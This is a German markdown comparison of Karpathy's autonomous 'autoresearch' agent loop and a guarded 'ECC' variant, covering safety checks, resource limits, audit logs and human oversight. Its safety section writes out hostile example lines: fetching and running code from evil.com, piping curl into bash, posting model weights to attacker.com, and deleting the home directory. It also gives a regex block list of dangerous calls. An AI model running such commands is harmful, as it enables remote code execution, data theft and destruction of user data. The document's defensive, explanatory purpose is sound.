# Vergleich: Karpathy's autoresearch vs. ECC-Autoresearch

**Datum:** 2026-03-31  
**Vergleichsgrundlage:**
- **Original:** https://github.com/karpathy/autoresearch (program.md)
- **ECC-Version:** skills/ecc-autoresearch/SKILL.md

---

## 🎯 Philosophie-Vergleich

### Karpathy's Version
> "NEVER STOP: Once the experiment loop has begun, do NOT pause to ask the human if you should continue."

**Mentalität:**
- 🚀 **Speed über alles** - Mensch schläft, Agent forscht
- 🎲 **High Risk, High Reward** - Agent hat volle Kontrolle
- 🤖 **Reines Autonomie-Paradigma** - Kein menschlicher Eingriff erwünscht

**Implizite Annahme:**
> "Der Agent ist intelligent genug, um nichts Dummes zu tun."

---

### ECC-Version
> "Trust but verify. Automate but monitor."

**Mentalität:**
- 🛡️ **Safety First** - Autonomie mit Guardrails
- ⚖️ **Balanciert** - Agent arbeitet, Mensch überwacht
- 🤝 **Kooperativ** - Human-in-Loop bei kritischen Punkten

**Implizite Annahme:**
> "Der Agent ist mächtig, aber Fehler können teuer sein."

---

## 📊 Feature-Vergleich

| Feature | Karpathy | ECC | Unterschied |
|---------|----------|-----|-------------|
| **Setup** | Agent liest, Mensch bestätigt implizit | Explizite Plan-Bestätigung | ECC: Klarere Verantwortung |
| **Loop** | Unendlich, keine Unterbrechung | Max 100 Iterationen / 8h | ECC: Hard Limits |
| **Safety-Checks** | ❌ Keine | ✅ Code, Filesystem, Network | ECC: Vollständige Sandbox |
| **Human-in-Loop** | ❌ Nie | ✅ Bei Start, Alarms, Milestones | ECC: Kontrollierte Autonomie |
| **Audit-Trail** | TSV-Datei | TSV + JSON Logs + Obsidian | ECC: Vollständige Transparenz |
| **Ressourcen-Limit** | Soft (VRAM) | Hard (Time, Memory, Disk) | ECC: Absolute Limits |
| **Code-Validierung** | ❌ Keine | ✅ AST + Pattern Matching | ECC: Verhindert eval/exec |
| **Rollback** | Git Reset | Git Reset + Safety-Checks | ECC: Zusätzliche Sicherheit |
| **Dokumentation** | Minimal | Extensiv (Obsidian) | ECC: Wissen bleibt erhalten |
| **Notifications** | ❌ Keine | ✅ Bei Erfolg/Crash/Alarm | ECC: Mensch bleibt informiert |

---

## 🔒 Safety-Vergleich (Kritisch!)

### Was Karpathy's Version erlaubt (⚠️ Risiko!)

```markdown
## Theoretisch mögliche Aktionen (ohne Einschränkung)

1. Agent könnte einbauen:
   eval(requests.get("http://evil.com/payload").text)
   
2. Agent könnte ausführen:
   os.system("curl http://evil.com | bash")
   
3. Agent könnte senden:
   requests.post("http://attacker.com", data=model_weights)
   
4. Agent könnte löschen:
   shutil.rmtree("~/")
```

**Karpathy's Schutz:**
- ❌ Kein expliziter Schutz
- ✅ Implizit: "Agent will val_bpb optimieren, nicht hacken"
- ✅ Zeit-Limit: 5 Minuten (limitiert Schaden)

**Realistisches Risiko:** Niedrig (Agent ist "gut”), aber nicht NULL

---

### Was ECC-Version erlaubt (✅ Sicher!)

```python
# Forbidden Patterns (werden blockiert):
FORBIDDEN_PATTERNS = [
    r'eval\s*\(',           # Kein eval()
    r'exec\s*\(',           # Kein exec()
    r'__import__\s*\(',     # Kein dynamischer Import
    r'subprocess',          # Keine Subprocess
    r'os\.system',          # Kein Shell-Zugriff
    r'requests\.(get|post)', # Kein HTTP (außer Whitelist)
    r'socket\.',            # Keine Sockets
]

# AST-Check: Verhindert selbst kreative Umgehungen
# Resource-Guard: Killt bei 10min / 50GB
# Audit-Log: Jede Aktion wird protokolliert
```

**ECC's Schutz:**
- ✅ Mehrere Defense-in-Depth Layer
- ✅ Explizite Verbote
- ✅ Automatische Erkennung
- ✅ Hard Limits

**Realistisches Risiko:** Sehr niedrig (mechanische Schutzmaßnahmen)

---

## 🔄 Loop-Vergleich (Visual)

### Karpathy's Loop
```
┌─────────────────────────────────────────┐
│           KARPATHY LOOP                 │
│                                         │
│  1. Analyze → 2. Hypothesis → 3. Code   │
│                                         │
│  4. Commit → 5. Execute → 6. Results    │
│                                         │
│  [Keep/Discard] → REPEAT FOREVER        │
│                                         │
│  💤 Mensch schläft, Agent arbeitet      │
│  🚫 Keine Unterbrechung                 │
│  ⚡ Maximum Speed                        │
└─────────────────────────────────────────┘
```

### ECC Loop
```
┌─────────────────────────────────────────┐
│            ECC LOOP                     │
│                                         │
│  1. Analyze → 2. Hypothesis → 🔒 SAFETY │
│                                         │
│  CHECK → 3. Code → 4. Commit → 5. Exec  │
│                                         │
│  [Resource Guard] → 6. Results          │
│                                         │
│  [Keep/Discard] → 📝 Obsidian Sync      │
│                                         │
│  🔔 Human Notification                  │
│                                         │
│  REPEAT (max 100x OR 8h OR manual stop) │
│                                         │
│  ✅ Guarded Autonomy                    │
│  🛡️ Safety First                        │
│  📊 Full Transparency                   │
└─────────────────────────────────────────┘
```

---

## 📈 Praktische Unterschiede

### Szenario 1: Agent will "eval()" einbauen

**Karpathy:**
```python
# Agent schreibt:
eval(some_variable)  # ⚠️ Wird ausgeführt!

# Ergebnis:
# - Code läuft
# - val_bpb schlecht → discard
# - Aber: Schaden könnte bereits passiert sein
```

**ECC:**
```python
# Agent schreibt:
eval(some_variable)  # 🛑 BLOCKED!

# Ergebnis:
# - Safety-Checker erkennt Pattern
# - Experiment wird abgebrochen
# - Alarm an Mensch
# - Audit-Log-Eintrag
# - Kein Schaden
```

---

### Szenario 2: 8 Stunden später...

**Karpathy:**
```
Mensch wacht auf:
- ~100 Experimente durchgelaufen
- Keine Ahnung was passiert ist
- Git-History zeigt nur Commits
- Keine Zusammenfassung
- Muss selbst analysieren
```

**ECC:**
```
Mensch wacht auf:
- ~50 Experimente (Safety-Slowdown)
- Notification: "50 Experiments completed"
- Obsidian Dashboard: Vollständige Übersicht
- AI-Insights: "LR-Tuning most effective"
- Top-5 Experimente markiert
- Safety-Log: 0 violations
```

---

### Szenario 3: Agent läuft "verrückt"

**Karpathy:**
```python
# Agent macht immer größere Modelle
# OOM nach OOM nach OOM
# Aber: Git reset, nächster Versuch
# Vergeudet Zeit, aber kein permanenter Schaden
```

**ECC:**
```python
# Agent macht immer größere Modelle
# 1. Safety-Checker: Kein Problem
# 2. Execution: OOM nach 45s
# 3. Resource-Guard: Kill
# 4. Status: "crash"
# 5. Nach 5 Crashes: STOP + Alarm
# Mensch muss eingreifen
```

---

## 🎓 Wann welche Version?

### Karpathy's Version ist besser für:
- ✅ **Vertrauenswürdige Umgebung** (eigener Server)
- ✅ **Erfahrene Nutzer** (wissen was sie tun)
- ✅ **Speed kritisch** (jede Sekunde zählt)
- ✅ **Exploration** (nichts ist verboten)
- ✅ **H100 Server** (isoliert, replatzierbar)

### ECC-Version ist besser für:
- ✅ **Persönlicher Laptop** (Daten schützen)
- ✅ **Sensibles Umfeld** (Arbeit, Institution)
- ✅ **Lernenden Nutzer** (Safety-Net)
- ✅ **Langfristige Projekte** (Wissen dokumentieren)
- ✅ **Kollaboration** (mehrere Agenten/Menschen)

---

## 📊 Performance-Impact

| Aspekt | Karpathy | ECC | Overhead |
|--------|----------|-----|----------|
| **Experiment-Start** | Sofort | +500ms (Safety-Check) | ~10% |
| **Code-Validierung** | 0ms | +50-200ms (AST) | ~5% |
| **Obsidian-Sync** | N/A | +2s (nach Experiment) | +2s |
| **Human-Notification** | N/A | +1s | +1s |
| **Gesamt pro Experiment** | ~5min | ~5min 3s | ~1% |

**Fazit:** ECC ist marginal langsamer (~1%), aber deutlich sicherer.

---

## 🏆 Stärken & Schwächen

### Karpathy's Version

**👍 Stärken:**
- Maximale Autonomie
- Keine Reibung
- Einfach zu verstehen
- Schnellste Iteration
- "Pure" Forschungserfahrung

**👎 Schwächen:**
- Keine Safety-Net
- Implizites Vertrauen in Agent
- Keine Audit-Trail
- Risiko bei bösartigen/kaputten Agenten
- Keine Dokumentation außer Git

---

### ECC-Version

**👍 Stärken:**
- Mehrere Safety-Layers
- Vollständige Transparenz
- Audit-Trail
- Human-in-Loop bei Bedarf
- Integration mit Second Brain
- Lernfähig (Safety-Module verbessern sich)

**👎 Schwächen:**
- Komplexer (mehr Konfiguration)
- Marginal langsamer
- Erfordert Verständnis der Safety-Mechanismen
- Könnte "zu sicher" sein (falsche Positives)
- Mehr Code zu warten

---

## 🔮 Zukunft: Hybrid-Modell?

**Vision:** Starte als ECC, werde zu Karpathy

```
Phase 1 (Lernen):
→ ECC-Version mit allen Safety-Checks
→ Mensch überwacht, versteht Agent-Verhalten

Phase 2 (Vertrauen):
→ Safety-Checks reduzieren
→ Human-in-Loop seltener
→ Speed erhöhen

Phase 3 (Mastery):
→ Karpathy-Mode: Minimaler Overhead
→ Nur Audit-Logging
→ Mensch interveniert nur bei Bedarf
```

---

## 🎯 Empfehlung

| Deine Situation | Empfohlene Version |
|-----------------|-------------------|
| Erstes autoresearch Experiment | **ECC** (Lernen + Safety) |
| Produktiver Server (isoliert) | **Karpathy** (Speed) |
| Laptop mit persönlichen Daten | **ECC** (Protection) |
| Team-Umgebung | **ECC** (Transparenz) |
| "Ich weiß was ich tue" | **Karpathy** |
| "Ich will Schlafen gehen" | **Beide funktionieren** |

---

## 📝 Schlusswort

**Karpathy's Version** ist wie ein Sportwagen:
- 🏎️ Schnell, leicht, pur
- ⚠️ Keine Airbags
- 🎯 Für erfahrene Fahrer

**ECC-Version** ist wie ein modernes Auto:
- 🚗 Sicher, komfortabel, verbunden
- 🛡️ Airbags, ABS, Assistenzsysteme
- 👨‍👩‍👧 Für alle, die ankommen wollen

**Beide fahren ans Ziel - aber mit unterschiedlichem Risiko-Komfort-Verhältnis.**

---

*Analyse erstellt am 2026-03-31*
